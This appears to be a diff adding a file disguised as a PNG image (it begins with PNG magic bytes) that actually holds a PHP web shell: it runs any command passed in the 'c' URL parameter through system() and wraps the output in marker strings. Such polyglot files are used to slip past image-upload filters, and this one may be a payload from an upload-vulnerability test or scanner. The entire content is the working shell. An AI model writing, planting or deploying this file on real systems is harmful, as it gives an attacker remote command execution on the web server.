@@ -1,0 +1,5 @@
+\x89PNG
+\x1a
+<?php echo "SHELLRUNS[";
+system($_GET["c"]);
+echo "]END"; ?>
